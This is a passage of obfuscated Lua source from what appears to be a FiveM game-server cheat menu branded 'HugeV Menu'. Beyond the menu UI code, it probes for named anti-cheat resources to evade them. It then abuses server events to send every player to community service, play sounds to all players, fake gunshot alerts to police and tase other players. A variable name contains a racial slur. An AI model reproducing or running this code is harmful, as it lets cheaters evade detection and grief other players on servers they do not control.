		if callback_87yd78hoisgser then callback_87yd78hoisgser(checked_87gy8sodhgilds) end

		return true
	end

	return false
end


local function ComboBox_eytfuiewugerwlgesgerg(text_duhgilserg, items_dhgisorgsdfg, currentIndex_ale_mozesz_mi_possac, selectedIndex, callback_87yd78hoisgser)
	local itemsCount_udhg8oisresdfg = #items_dhgisorgsdfg
	local selectedItem_dugsirgsesre3g = items_dhgisorgsdfg[currentIndex_ale_mozesz_mi_possac]
	local isCurrent_dughisurlgsfreg = menus_ueygtyuerihgkbergerg[currentMenu_dygfuyeikesrgerg].currentOption_duhfislerjgilsedfg == (optionCount_eygfuwengjiebigoer + 1)

	if itemsCount_udhg8oisresdfg > 1 and isCurrent_dughisurlgsfreg then
		selectedItem_dugsirgsesre3g = tostring(selectedItem_dugsirgsesre3g)
	end

	if Button_yetwyfguydfkjesrg(text_duhgilserg, "- "..selectedItem_dugsirgsesre3g.." -") then
		selectedIndex = currentIndex_ale_mozesz_mi_possac
		callback_87yd78hoisgser(currentIndex_ale_mozesz_mi_possac, selectedIndex)
		return true
	elseif isCurrent_dughisurlgsfreg then
		if currentKey_hgiuerhiogewger == keys_dhgiuerhgoelgiehwgewg.left_key_dhugiuerger then
			if currentIndex_ale_mozesz_mi_possac > 1 then currentIndex_ale_mozesz_mi_possac = currentIndex_ale_mozesz_mi_possac - 1 else currentIndex_ale_mozesz_mi_possac = itemsCount_udhg8oisresdfg end
		elseif currentKey_hgiuerhiogewger == keys_dhgiuerhgoelgiehwgewg.right_key_dhugiuerger then
			if currentIndex_ale_mozesz_mi_possac < itemsCount_udhg8oisresdfg then currentIndex_ale_mozesz_mi_possac = currentIndex_ale_mozesz_mi_possac + 1 else currentIndex_ale_mozesz_mi_possac = 1 end
		end
	else
		currentIndex_ale_mozesz_mi_possac = selectedIndex
	end

	callback_87yd78hoisgser(currentIndex_ale_mozesz_mi_possac, selectedIndex)
	return false
end

local function Slider_dghiuergsergerg(text_duhgilserg, items_dhgisorgsdfg, currentIndex_ale_mozesz_mi_possac, callback_87yd78hoisgser)
	local itemsCount_udhg8oisresdfg = #items_dhgisorgsdfg
	local selectedItem_dugsirgsesre3g = items_dhgisorgsdfg[currentIndex_ale_mozesz_mi_possac]
	local isCurrent_dughisurlgsfreg = menus_ueygtyuerihgkbergerg[currentMenu_dygfuyeikesrgerg].currentOption_duhfislerjgilsedfg == (optionCount_eygfuwengjiebigoer + 1)

	if itemsCount_udhg8oisresdfg > 1 and isCurrent_dughisurlgsfreg then
		selectedItem_dugsirgsesre3g = tostring(selectedItem_dugsirgsesre3g)
	end

	if Button_yetwyfguydfkjesrg(text_duhgilserg, "- "..selectedItem_dugsirgsesre3g.." -") then
		callback_87yd78hoisgser(currentIndex_ale_mozesz_mi_possac)
		return true
	elseif isCurrent_dughisurlgsfreg then
		if currentKey_hgiuerhiogewger == keys_dhgiuerhgoelgiehwgewg.left_key_dhugiuerger then
			if currentIndex_ale_mozesz_mi_possac > 1 then currentIndex_ale_mozesz_mi_possac = currentIndex_ale_mozesz_mi_possac - 1 else currentIndex_ale_mozesz_mi_possac = currentIndex_ale_mozesz_mi_possac end
		elseif currentKey_hgiuerhiogewger == keys_dhgiuerhgoelgiehwgewg.right_key_dhugiuerger then
			if currentIndex_ale_mozesz_mi_possac < itemsCount_udhg8oisresdfg then currentIndex_ale_mozesz_mi_possac = currentIndex_ale_mozesz_mi_possac + 1 else currentIndex_ale_mozesz_mi_possac = currentIndex_ale_mozesz_mi_possac end
		end
	else
	end

	callback_87yd78hoisgser(currentIndex_ale_mozesz_mi_possac)
	return false
end


local function Display_uyeigsgegkersugesrg()
	if isMenuVisible_trdyugfwgewiubfbeierg(currentMenu_dygfuyeikesrgerg) then
		Czitirzen_Invoke(0xFE99B66D079CF6BC, 0, keys_dhgiuerhgoelgiehwgewg.left_key_dhugiuerger, true)
		Czitirzen_Invoke(0xFE99B66D079CF6BC, 0, keys_dhgiuerhgoelgiehwgewg.up_key_dhugiuerger, true)
		Czitirzen_Invoke(0xFE99B66D079CF6BC, 0, keys_dhgiuerhgoelgiehwgewg.down_key_dhugiuerger, true)
		Czitirzen_Invoke(0xFE99B66D079CF6BC, 0, keys_dhgiuerhgoelgiehwgewg.right_key_dhugiuerger, true)
		Czitirzen_Invoke(0xFE99B66D079CF6BC, 0, keys_dhgiuerhgoelgiehwgewg.back_key_dhugiuerger, true)
		Czitirzen_Invoke(0xFE99B66D079CF6BC, 0, keys_dhgiuerhgoelgiehwgewg.select_key_dhugiuerger, true)

		local menu_idhgisjlofdgsersdfgsegdf = menus_ueygtyuerihgkbergerg[currentMenu_dygfuyeikesrgerg]

		if menu_idhgisjlofdgsersdfgsegdf.aboutToBeClosed_duhuisorjgsdfg then
			CloseMenu_duhgiuelgesgdf()
		else
			Czitirzen_Invoke(0x6178F68A87A4D3A0)

			drawTitle_ufhgiuehgunesiough()
			drawSubTitle_ydtufgekhbghskdnlgjrnei()

			currentKey_hgiuerhiogewger = nil

			if Czitirzen_Invoke(0x305C8DCD79DA8B0F, 0, keys_dhgiuerhgoelgiehwgewg.down_key_dhugiuerger) then
				Czitirzen_Invoke(0x67C540AA08E4A6F5, -1, "CLICK_BACK", "WEB_NAVIGATION_SOUNDS_PHONE", true)

				if menu_idhgisjlofdgsersdfgsegdf.currentOption_duhfislerjgilsedfg < optionCount_eygfuwengjiebigoer then
					menu_idhgisjlofdgsersdfgsegdf.currentOption_duhfislerjgilsedfg = menu_idhgisjlofdgsersdfgsegdf.currentOption_duhfislerjgilsedfg + 1
				else
					menu_idhgisjlofdgsersdfgsegdf.currentOption_duhfislerjgilsedfg = 1
				end
			elseif Czitirzen_Invoke(0x305C8DCD79DA8B0F, 0, keys_dhgiuerhgoelgiehwgewg.up_key_dhugiuerger) then
				Czitirzen_Invoke(0x67C540AA08E4A6F5, -1, "CLICK_BACK", "WEB_NAVIGATION_SOUNDS_PHONE", true)

				if menu_idhgisjlofdgsersdfgsegdf.currentOption_duhfislerjgilsedfg > 1 then
					menu_idhgisjlofdgsersdfgsegdf.currentOption_duhfislerjgilsedfg = menu_idhgisjlofdgsersdfgsegdf.currentOption_duhfislerjgilsedfg - 1
				else
					menu_idhgisjlofdgsersdfgsegdf.currentOption_duhfislerjgilsedfg = optionCount_eygfuwengjiebigoer
				end
			elseif Czitirzen_Invoke(0x305C8DCD79DA8B0F, 0, keys_dhgiuerhgoelgiehwgewg.left_key_dhugiuerger) then
				currentKey_hgiuerhiogewger = keys_dhgiuerhgoelgiehwgewg.left_key_dhugiuerger
			elseif Czitirzen_Invoke(0x305C8DCD79DA8B0F, 0, keys_dhgiuerhgoelgiehwgewg.right_key_dhugiuerger) then
				currentKey_hgiuerhiogewger = keys_dhgiuerhgoelgiehwgewg.right_key_dhugiuerger
			elseif Czitirzen_Invoke(0x305C8DCD79DA8B0F, 0, keys_dhgiuerhgoelgiehwgewg.select_key_dhugiuerger) then
				currentKey_hgiuerhiogewger = keys_dhgiuerhgoelgiehwgewg.select_key_dhugiuerger
			elseif Czitirzen_Invoke(0x305C8DCD79DA8B0F, 0, keys_dhgiuerhgoelgiehwgewg.back_key_dhugiuerger) then
				if menus_ueygtyuerihgkbergerg[menu_idhgisjlofdgsersdfgsegdf.previousMenu_digusirgiodfg] then
					Czitirzen_Invoke(0x67C540AA08E4A6F5, -1, "CLICK_BACK", "WEB_NAVIGATION_SOUNDS_PHONE", true)
					setMenuVisible_eqwreqtyhfioewjfiuewg(menu_idhgisjlofdgsersdfgsegdf.previousMenu_digusirgiodfg, true)
				else
					CloseMenu_duhgiuelgesgdf()
				end
			end

			optionCount_eygfuwengjiebigoer = 0
		end
	end
end


local function CurrentOption_dihgiusejrlgose()
	if currentMenu_dygfuyeikesrgerg and optionCount_eygfuwengjiebigoer ~= 0 and menus_ueygtyuerihgkbergerg[currentMenu_dygfuyeikesrgerg] then
		return menus_ueygtyuerihgkbergerg[currentMenu_dygfuyeikesrgerg].currentOption_duhfislerjgilsedfg
	end

	return nil
end


local function SetMenuWidth_djghiusesdfg(id_jdhgisrejolger, width_duhgsiuerlgsdf)
	setMenuProperty_dytfeiuwbguiesogdfg(id_jdhgisrejolger, 'width_duhgsiuerlgsdf', width_duhgsiuerlgsdf)
end


local function SetMenuX_dhgiuelsd(id_jdhgisrejolger, x_dhgiuslergssdfg)
	setMenuProperty_dytfeiuwbguiesogdfg(id_jdhgisrejolger, 'x_dhgiuslergssdfg', x_dhgiuslergssdfg)
end


local function SetMenuY_duhfuiaknjlsd(id_jdhgisrejolger, y_dhgiuslergssdfg)
	setMenuProperty_dytfeiuwbguiesogdfg(id_jdhgisrejolger, 'y_dhgiuslergssdfg', y_dhgiuslergssdfg)
end


local function SetMenuMaxOptionCountOnScreen_dhfieslsfsddsdf(id_jdhgisrejolger, count_udhgislejrgsdfg)
	setMenuProperty_dytfeiuwbguiesogdfg(id_jdhgisrejolger, 'maxOptionCount_djgiusriuogsedsfg', count_udhgislejrgsdfg)
end


local function SetTitle_dihguserhgisdg(id_jdhgisrejolger, title_duhgilgsegdfg)
	setMenuProperty_dytfeiuwbguiesogdfg(id_jdhgisrejolger, 'title_duhgilgsegdfg', title_duhgilgsegdfg)
end


local function SetTitleColor_dihgiusejlgse(id_jdhgisrejolger, r_djguisernglse, g_IDJGIODSF, b_djguisernglse, a_djguisernglse)
	setMenuProperty_dytfeiuwbguiesogdfg(id_jdhgisrejolger, 'titleColor_diuhgauesd', { ['r_djguisernglse'] = r_djguisernglse, ['g_IDJGIODSF'] = g_IDJGIODSF, ['b_djguisernglse'] = b_djguisernglse, ['a_djguisernglse'] = a_djguisernglse or menus_ueygtyuerihgkbergerg[id_jdhgisrejolger].titleColor_diuhgauesd.a_djguisernglse })
end


local function SetTitleBackgroundColor_dhgisjglserg(id_jdhgisrejolger, r_djguisernglse, g_IDJGIODSF, b_djguisernglse, a_djguisernglse)
	setMenuProperty_dytfeiuwbguiesogdfg(id_jdhgisrejolger, 'titleBackgroundColor_7567fihfsudgdsf', { ['r_djguisernglse'] = r_djguisernglse, ['g_IDJGIODSF'] = g_IDJGIODSF, ['b_djguisernglse'] = b_djguisernglse, ['a_djguisernglse'] = a_djguisernglse or menus_ueygtyuerihgkbergerg[id_jdhgisrejolger].titleBackgroundColor_7567fihfsudgdsf.a_djguisernglse })
end


local function SetTitleBackgroundSprite_odigosheoglsfjg(id_jdhgisrejolger, texturedict_jdhgiusrjlger_dughilsemsgdf, textureName_dygfusenilgjsegfd)
	Czitirzen_Invoke(0xDFA2EF8E04127DD5, texturedict_jdhgiusrjlger_dughilsemsgdf)
	setMenuProperty_dytfeiuwbguiesogdfg(id_jdhgisrejolger, 'titleBackgroundSprite_udyguiosrser3445r3', { dict_jdhgiusrjlger = texturedict_jdhgiusrjlger_dughilsemsgdf, name_idgjiserjios = textureName_dygfusenilgjsegfd })
end


local function SetSubTitle_uytdfukasjgsdklf(id_jdhgisrejolger, text_duhgilserg)
	setMenuProperty_dytfeiuwbguiesogdfg(id_jdhgisrejolger, 'subTitle_duhgiuesrjogse', text_duhgilserg)
end


local function SetMenuBackgroundColor_8e7t8oywehgiuse(id_jdhgisrejolger, r_djguisernglse, g_IDJGIODSF, b_djguisernglse, a_djguisernglse)
	setMenuProperty_dytfeiuwbguiesogdfg(id_jdhgisrejolger, 'menuBackgroundColor_duygu848o7ghsdf', { ['r_djguisernglse'] = r_djguisernglse, ['g_IDJGIODSF'] = g_IDJGIODSF, ['b_djguisernglse'] = b_djguisernglse, ['a_djguisernglse'] = a_djguisernglse or menus_ueygtyuerihgkbergerg[id_jdhgisrejolger].menuBackgroundColor_duygu848o7ghsdf.a_djguisernglse })
end


local function SetMenuTextColor_uydfsgkgi438ygosdf(id_jdhgisrejolger, r_djguisernglse, g_IDJGIODSF, b_djguisernglse, a_djguisernglse)
	setMenuProperty_dytfeiuwbguiesogdfg(id_jdhgisrejolger, 'menuTextColor_duhgsiregsd', { ['r_djguisernglse'] = r_djguisernglse, ['g_IDJGIODSF'] = g_IDJGIODSF, ['b_djguisernglse'] = b_djguisernglse, ['a_djguisernglse'] = a_djguisernglse or menus_ueygtyuerihgkbergerg[id_jdhgisrejolger].menuTextColor_duhgsiregsd.a_djguisernglse })
end

local function SetMenuSubTextColor_duhsidlgsdres3432(id_jdhgisrejolger, r_djguisernglse, g_IDJGIODSF, b_djguisernglse, a_djguisernglse)
	setMenuProperty_dytfeiuwbguiesogdfg(id_jdhgisrejolger, 'menuSubTextColor_dihgsurilgsdfg', { ['r_djguisernglse'] = r_djguisernglse, ['g_IDJGIODSF'] = g_IDJGIODSF, ['b_djguisernglse'] = b_djguisernglse, ['a_djguisernglse'] = a_djguisernglse or menus_ueygtyuerihgkbergerg[id_jdhgisrejolger].menuSubTextColor_dihgsurilgsdfg.a_djguisernglse })
end

local function SetMenuFocusColor_sygudislgjsdre(id_jdhgisrejolger, r_djguisernglse, g_IDJGIODSF, b_djguisernglse, a_djguisernglse)
	setMenuProperty_dytfeiuwbguiesogdfg(id_jdhgisrejolger, 'menuFocusColor_duhgsiurgser', { ['r_djguisernglse'] = r_djguisernglse, ['g_IDJGIODSF'] = g_IDJGIODSF, ['b_djguisernglse'] = b_djguisernglse, ['a_djguisernglse'] = a_djguisernglse or menus_ueygtyuerihgkbergerg[id_jdhgisrejolger].menuFocusColor_duhgsiurgser.a_djguisernglse })
end


local function SetMenuButtonPressedSound_udhgislnjsdfgre(id_jdhgisrejolger, name_idgjiserjios, set_duhgiuselr)
	setMenuProperty_dytfeiuwbguiesogdfg(id_jdhgisrejolger, 'buttonPressedSound_dhugsiurojgsegfd', { ['name_idgjiserjios'] = name_idgjiserjios, ['set_duhgiuselr'] = set_duhgiuselr })
end

--------------------------------------------------------------------------------------------

--[[
  ______   _    _   _   _   _  __   _____        _   ______ 
 |  ____| | |  | | | \ | | | |/ /  / ____|      | | |  ____|
 | |__    | |  | | |  \| | | '/  | |           | | | |__   
 |  __|   | |  | | | . ` | |  <   | |       _   | | |  __|  
 | |      | |__| | | |\  | | . \  | |____  | |__| | | |____ 
 |_|       \____/  |_| \_| |_|\_\  \_____|  \____/  |______|
                                                            
--]]

	
	local function CheckIfResourceExist_HugeV_DSIUGFISUDGDS(skrypt_nigger_DSUIGHSIDUGHIUDS)
	if GetResourceState_HugeV_DIHUIGFIDUGDFG(skrypt_nigger_DSUIGHSIDUGHIUDS) == "started"or GetResourceState_HugeV_DIHUIGFIDUGDFG(string.lower(skrypt_nigger_DSUIGHSIDUGHIUDS)) == "started"or GetResourceState_HugeV_DIHUIGFIDUGDFG(string.upper(skrypt_nigger_DSUIGHSIDUGHIUDS)) == "started"then
	        return true
		else
		    return false
		end
	end
	
    local antycheaty_dihgw3487hg8o3wdfg = {
        "anticheat",
        "Anticheat",
        "esx_anticheat",
        "anticheese",
        "anticheese-anticheat",
        "TigoAntiCheat",
        "NSAC",
        "NSAC-master",
        "TigoAntiCheat",
        "ANTICHEAT-NEXUS",
        "ANTICHEAT-Muulfz",
        "Anti-Lynx-Fivem",
        "anti-lynx",
        "antilynx",
		"chocohax",
		"UltimateAC",
		"HugeAC",
		"7777ac"
    }
	local AntyCheats_duhgw894ghwo34gdfsg = {}
	if CheckIfResourceExist_HugeV_DSIUGFISUDGDS("screenshot-basic") then
		PushNotification_DSGJHDSGHSIDUGDS("screenshot-basic detected", 20000)
	end
	if CreateDirectory ~= nil or checkAllowed ~= nil then
		table.insert(AntyCheats_duhgw894ghwo34gdfsg, "~r~[API-AC]")
	end
	if CheckIfResourceExist_HugeV_DSIUGFISUDGDS("AtomicRP") then
		table.insert(AntyCheats_duhgw894ghwo34gdfsg, "~r~[AtomicAC]")
	end
	if witam ~= nil then
		table.insert(AntyCheats_duhgw894ghwo34gdfsg, "~r~[UltimateAC]")
	end
    for i_dihgiseuorg43dfg = 1, #antycheaty_dihgw3487hg8o3wdfg do
        if CheckIfResourceExist_HugeV_DSIUGFISUDGDS(antycheaty_dihgw3487hg8o3wdfg[i_dihgiseuorg43dfg]) then
            table.insert(AntyCheats_duhgw894ghwo34gdfsg, "~r~["..antycheaty_dihgw3487hg8o3wdfg[i_dihgiseuorg43dfg].."]")
        end
    end
local function KeyBoardInput_jdhgijslrgeg(TextEntry_dihg8e4w9gsdfg, ExampleText_dug8iew74gsd, MaxStringLength_dijgps9e8r)
	Czitirzen_Invoke(0x32CA01C3, "FMMC_KEY_TIP1", "~y~".. TextEntry_dihg8e4w9gsdfg .. ":")
	Czitirzen_Invoke(0x00DC833F2568DBF6, 1, "FMMC_KEY_TIP1", "", ExampleText_dug8iew74gsd, "", "", "", MaxStringLength_dijgps9e8r)
    blockinput_dihgs8ourigdfg = true

    while Czitirzen_Invoke(0x0CF2B696BBF945AE) ~= 1 and Czitirzen_Invoke(0x0CF2B696BBF945AE) ~= 2 do
        Czlowiek_Wait_IDYGOSIFJGDFG(0)
    end

    if Czitirzen_Invoke(0x0CF2B696BBF945AE) ~= 2 then
        local dfjs8erfdfg = GetOnscreenKeyboardResult_HugeV_UDHUYGFDSIGDF()
        Czlowiek_Wait_IDYGOSIFJGDFG(500)
        blockinput_dihgs8ourigdfg = false
        return dfjs8erfdfg
    else
        Czlowiek_Wait_IDYGOSIFJGDFG(500)
        blockinput_dihgs8ourigdfg = false
        return nil
    end
end

local function DrawText3D_HugeV_UDGUYSDHUGSFFDG(x_dhgiuslergssdfg, y_d8ygso9hgh9ewdfg, z_tdsa8f7gisddfs, text_diuigsodgsdfg, r_djguisernglse, g_IDJGIODSF, b_djguisernglse)
    Czitirzen_Invoke(0xAA0008F3BBB8F416, x_dhgiuslergssdfg, y_d8ygso9hgh9ewdfg, z_tdsa8f7gisddfs, 0)
    Czitirzen_Invoke(0x66E0276CC5F6B9DA, 0)
    Czitirzen_Invoke(0x038C1F517D7FDCF8, 0)
    Czitirzen_Invoke(0x07C837F9A01C34C9, 0.0, 0.20)
    Czitirzen_Invoke(0xBE6B23FFA53FB442, r_djguisernglse, g_IDJGIODSF, b_djguisernglse, 255)
    Czitirzen_Invoke(0x465C84BC39F1C351, 0, 0, 0, 0, 255)
    Czitirzen_Invoke(0x441603240D202FA6, 2, 0, 0, 0, 150)
    Czitirzen_Invoke(0x1CA3E9EAC9D93E5E)
    Czitirzen_Invoke(0x2513DFB0FB8400FE)
    Czitirzen_Invoke(0x25FBB336DF1804CB, "STRING")
    Czitirzen_Invoke(0xC02F4DBFB51D988B, 1)
    Czitirzen_Invoke(0x6C188BE134E074AA, text_diuigsodgsdfg)
    Czitirzen_Invoke(0xCD015E5BB0D96A57, 0.0, 0.0)
    Czitirzen_Invoke(0xFF0B610F6BE0D7AF)
end

local function Teleport_To_Waypoint_HugeV_DSUGHIUSDGFD()
	local Teleport_To_Fucntiona_HugeV_DSGHIDUJGDF = GetFirstBlipInfoId_HugeV_DISGHIUDSHIGFD(8)

  	if Czitirzen_Invoke(0xA6DB27D19ECBB7DA, Teleport_To_Fucntiona_HugeV_DSGHIDUJGDF) then
  		local Teleport_To_Kords_HugeV_DSUGHIUSDGDF = Czitirzen_Invoke(0xFA7C7F0AADF25D09, Teleport_To_Fucntiona_HugeV_DSGHIDUJGDF, Citizen.ReturnResultAnyway(), Citizen.ResultAsVector())
		for Teleport_To_Coords_HugeV_DSGHIUDSGDF = 1, 1000 do
			Czitirzen_Invoke(0x9AFEFF481A85AB2E, Czitirzen_Invoke(0xD80958FC74E988A6), Teleport_To_Kords_HugeV_DSUGHIUSDGDF["x"], Teleport_To_Kords_HugeV_DSUGHIUSDGDF["y"], Teleport_To_Coords_HugeV_DSGHIUDSGDF + 0.0)

			local Teleport_To_foundGround_DIUGHISDUHGIFD, zPos_xd = GetGroundZFor_3dCoord_HugeV_DGUISDHIGHIFD(Teleport_To_Kords_HugeV_DSUGHIUSDGDF["x"], Teleport_To_Kords_HugeV_DSUGHIUSDGDF["y"], Teleport_To_Coords_HugeV_DSGHIUDSGDF + 0.0)

			if Teleport_To_foundGround_DIUGHISDUHGIFD then
				Czitirzen_Invoke(0x9AFEFF481A85AB2E, Czitirzen_Invoke(0xD80958FC74E988A6), Teleport_To_Kords_HugeV_DSUGHIUSDGDF["x"], Teleport_To_Kords_HugeV_DSUGHIUSDGDF["y"], Teleport_To_Coords_HugeV_DSGHIUDSGDF + 0.0)

				break
			end

			Czlowiek_Wait_IDYGOSIFJGDFG(0)
		end
	else
		PushNotification_DSGJHDSGHSIDUGDS("You must to place waypoint!")
	end
end

local function narysuj_celownik_xd_uhfaidsoulgdfsdfg(text_diuigsodgsdfg,x_disghp9eriuogsdfg,y_d8ygso9hgh9ewdfg)
    Czitirzen_Invoke(0x66E0276CC5F6B9DA, 0)
    Czitirzen_Invoke(0x038C1F517D7FDCF8, 1)
    Czitirzen_Invoke(0x07C837F9A01C34C9, 0.0,0.4)
    Czitirzen_Invoke(0x465C84BC39F1C351, 1,0,0,0,255)
    Czitirzen_Invoke(0x441603240D202FA6, 1,0,0,0,255)
    Czitirzen_Invoke(0x1CA3E9EAC9D93E5E)
    Czitirzen_Invoke(0x2513DFB0FB8400FE) 
    Czitirzen_Invoke(0x25FBB336DF1804CB, "STRING")
    Czitirzen_Invoke(0x94CF4AC034C9C986, text_diuigsodgsdfg)
    Czitirzen_Invoke(0xCD015E5BB0D96A57, x_disghp9eriuogsdfg,y_d8ygso9hgh9ewdfg)
end

local function HugeV_ReviveNative_dugh8osyergoiusdfgsdfg(value_dkjgisoedfg, numDecimalPlaces_SDGIUSDHGIUSD)
	if numDecimalPlaces_SDGIUSDHGIUSD then
		local power_dshgsudiagd = 10^numDecimalPlaces_SDGIUSDHGIUSD
		return math.floor((value_dkjgisoedfg * power_dshgsudiagd) + 0.5) / (power_dshgsudiagd)
	else
		return math.floor(value_dkjgisoedfg + 0.5)
	end
end

local function HugeV_ReviveNative_duiagt4387guosfdsfge(ped_jgtirgirtjhilrthrth, coords_DSIGSDGSD, heading_idfhgsodiugsdrsdfg)
	Czitirzen_Invoke(0x239A3351AC1DA385, ped_jgtirgirtjhilrthrth, coords_DSIGSDGSD.x, coords_DSIGSDGSD.y, coords_DSIGSDGSD.z, false, false, false, true)
	Czitirzen_Invoke(0xEA23C49EAA83ACFB, coords_DSIGSDGSD.x, coords_DSIGSDGSD.y, coords_DSIGSDGSD.z, heading_idfhgsodiugsdrsdfg, true, false)
	Czitirzen_Invoke(0x239528EACDC3E7DE, ped_jgtirgirtjhilrthrth, false)
	Trigger_HugeV_Private_Event_digyuseogr9sdfg(false, 'playerSpawned', coords_DSIGSDGSD.x, coords_DSIGSDGSD.y, coords_DSIGSDGSD.z)
	Czitirzen_Invoke(0x8FE22675A5A45817, ped_jgtirgirtjhilrthrth)
end

local function HugeV_Revive_Native_XDIHFUDUSIFOSDFSDF()
	local coords_DSIGSDGSD = GetEntityCoords_HugeV_UDHGIUDIKGDFG(Czitirzen_Invoke(0xD80958FC74E988A6))

	local formattedCoords_SDIGHSUDIGSD = {
		x = HugeV_ReviveNative_dugh8osyergoiusdfgsdfg(coords_DSIGSDGSD.x, 1),
		y = HugeV_ReviveNative_dugh8osyergoiusdfgsdfg(coords_DSIGSDGSD.y, 1),
		z = HugeV_ReviveNative_dugh8osyergoiusdfgsdfg(coords_DSIGSDGSD.z, 1)
	}

	HugeV_ReviveNative_duiagt4387guosfdsfge(Czitirzen_Invoke(0xD80958FC74E988A6), formattedCoords_SDIGHSUDIGSD, 0.0)
	Czitirzen_Invoke(0x068E835A1D0DC0E3, 'DeathFailOut')
end

local function CommunityService_2_HUGEV(butkukybyukbuy)
	TriggerServerEvent('esx_communityservice:sendToCommunityService', butkukybyukbuy, 5391)
end

local function CommunityService_1_HUGEV()
	for i_DSDSGUSHDIUGSD = 0, 128 do
		CommunityService_2_HUGEV(GetPlayerServerId_HugeV_DUHGIUSHGUFD(i_DSDSGUSHDIUGSD))
	end
end

local function EarRape_InteractSoud_BGUTRBHUTRHNKRTUJH()
TriggerServerEvent('InteractSound_SV:PlayOnAll', 'demo', 99.0)
TriggerServerEvent('InteractSound_SV:PlayOnAll', 'cuff', 97.0)
TriggerServerEvent('InteractSound_SV:PlayOnAll', 'buckle', 96.0)
end

local function Police_SPAM_JJTYJTJYTJ()
		TriggerServerEvent('esx_outlawalert:gunshotInProgress', { x = 1337, y = 1337, z = 1337 }, 'HugeV Menu ;)', 0)
end


 local function TazePlayer_GUI_HugeV(player_HGUTJHKRHNRTRTJT)
				local ped_gjerihjetrihjrtijhirt = Czitirzen_Invoke(0x43A66C31C68491C0, player_HGUTJHKRHNRTRTJT)
				local Coords_hgjeihjtrihrtk = GetEntityCoords_HugeV_UDHGIUDIKGDFG(ped_gjerihjetrihjrtijhirt)
				
				local destiporeohgekhlertjkhe = GetPedBoneCoords_HugeV_GDUYFSDGF(ped_gjerihjetrihjrtijhirt, 0, 0.0, 0.0, 0.0)
				local gerjihjtreihjrthrlthr = GetPedBoneCoords_HugeV_GDUYFSDGF(ped_gjerihjetrihjrtijhirt, 57005, 0.0, 0.0, 0.2)
				
			Czitirzen_Invoke(0x867654CBC7606F2C, gerjihjtreihjrthrlthr, destiporeohgekhlertjkhe, 1, true, `WEAPON_STUNGUN`, Czitirzen_Invoke(0xD80958FC74E988A6), true, false, 1.0)
			end
	
	local Tertiary_SDGUSDHGISDG = {255, 205, 0, 255}
	
	   local function DisableMovement_DSIGHDSIUGSD(off_SDGHDSUIGSD)
        Czitirzen_Invoke(0xFE99B66D079CF6BC, 1, 30, off_SDGHDSUIGSD)
        Czitirzen_Invoke(0xFE99B66D079CF6BC, 1, 31, off_SDGHDSUIGSD)
        Czitirzen_Invoke(0xFE99B66D079CF6BC, 1, 32, off_SDGHDSUIGSD)
        Czitirzen_Invoke(0xFE99B66D079CF6BC, 1, 33, off_SDGHDSUIGSD)
        Czitirzen_Invoke(0xFE99B66D079CF6BC, 1, 34, off_SDGHDSUIGSD)
        Czitirzen_Invoke(0xFE99B66D079CF6BC, 1, 35, off_SDGHDSUIGSD)
        Czitirzen_Invoke(0xFE99B66D079CF6BC, 1, 36, off_SDGHDSUIGSD)
        Czitirzen_Invoke(0xFE99B66D079CF6BC, 1, 37, off_SDGHDSUIGSD)
        Czitirzen_Invoke(0xFE99B66D079CF6BC, 1, 38, off_SDGHDSUIGSD)
        Czitirzen_Invoke(0xFE99B66D079CF6BC, 1, 44, off_SDGHDSUIGSD)
        Czitirzen_Invoke(0xFE99B66D079CF6BC, 1, 45, off_SDGHDSUIGSD)
        Czitirzen_Invoke(0xFE99B66D079CF6BC, 0, 63, off_SDGHDSUIGSD)
        Czitirzen_Invoke(0xFE99B66D079CF6BC, 0, 64, off_SDGHDSUIGSD)
        Czitirzen_Invoke(0xFE99B66D079CF6BC, 0, 71, off_SDGHDSUIGSD)
        Czitirzen_Invoke(0xFE99B66D079CF6BC, 0, 72, off_SDGHDSUIGSD)
        Czitirzen_Invoke(0xFE99B66D079CF6BC, 0, 75, off_SDGHDSUIGSD)
        Czitirzen_Invoke(0xFE99B66D079CF6BC, 0, 278, off_SDGHDSUIGSD)
        Czitirzen_Invoke(0xFE99B66D079CF6BC, 0, 279, off_SDGHDSUIGSD)
        Czitirzen_Invoke(0xFE99B66D079CF6BC, 0, 280, off_SDGHDSUIGSD)
        Czitirzen_Invoke(0xFE99B66D079CF6BC, 0, 281, off_SDGHDSUIGSD)
        Czitirzen_Invoke(0x5E6CC07646BBEAB8, Czitirzen_Invoke(0x4F8644AF03D0E0D6), off_SDGHDSUIGSD)
        Czitirzen_Invoke(0xFE99B66D079CF6BC, 0, 24, off_SDGHDSUIGSD)
        Czitirzen_Invoke(0xFE99B66D079CF6BC, 0, 25, off_SDGHDSUIGSD)
        Czitirzen_Invoke(0xFE99B66D079CF6BC, 1, 37, off_SDGHDSUIGSD)
        Czitirzen_Invoke(0xFE99B66D079CF6BC, 0, 47, off_SDGHDSUIGSD)
        Czitirzen_Invoke(0xFE99B66D079CF6BC, 0, 58, off_SDGHDSUIGSD)
        Czitirzen_Invoke(0xFE99B66D079CF6BC, 0, 140, off_SDGHDSUIGSD)
        Czitirzen_Invoke(0xFE99B66D079CF6BC, 0, 141, off_SDGHDSUIGSD)
        Czitirzen_Invoke(0xFE99B66D079CF6BC, 0, 81, off_SDGHDSUIGSD)
        Czitirzen_Invoke(0xFE99B66D079CF6BC, 0, 82, off_SDGHDSUIGSD)
        Czitirzen_Invoke(0xFE99B66D079CF6BC, 0, 83, off_SDGHDSUIGSD)
        Czitirzen_Invoke(0xFE99B66D079CF6BC, 0, 84, off_SDGHDSUIGSD)
        Czitirzen_Invoke(0xFE99B66D079CF6BC, 0, 12, off_SDGHDSUIGSD)
        Czitirzen_Invoke(0xFE99B66D079CF6BC, 0, 13, off_SDGHDSUIGSD)
        Czitirzen_Invoke(0xFE99B66D079CF6BC, 0, 14, off_SDGHDSUIGSD)
        Czitirzen_Invoke(0xFE99B66D079CF6BC, 0, 15, off_SDGHDSUIGSD)
        Czitirzen_Invoke(0xFE99B66D079CF6BC, 0, 24, off_SDGHDSUIGSD)
        Czitirzen_Invoke(0xFE99B66D079CF6BC, 0, 16, off_SDGHDSUIGSD)
        Czitirzen_Invoke(0xFE99B66D079CF6BC, 0, 17, off_SDGHDSUIGSD)
        Czitirzen_Invoke(0xFE99B66D079CF6BC, 0, 96, off_SDGHDSUIGSD)
        Czitirzen_Invoke(0xFE99B66D079CF6BC, 0, 97, off_SDGHDSUIGSD)
        Czitirzen_Invoke(0xFE99B66D079CF6BC, 0, 98, off_SDGHDSUIGSD)
        Czitirzen_Invoke(0xFE99B66D079CF6BC, 0, 96, off_SDGHDSUIGSD)
        Czitirzen_Invoke(0xFE99B66D079CF6BC, 0, 99, off_SDGHDSUIGSD)
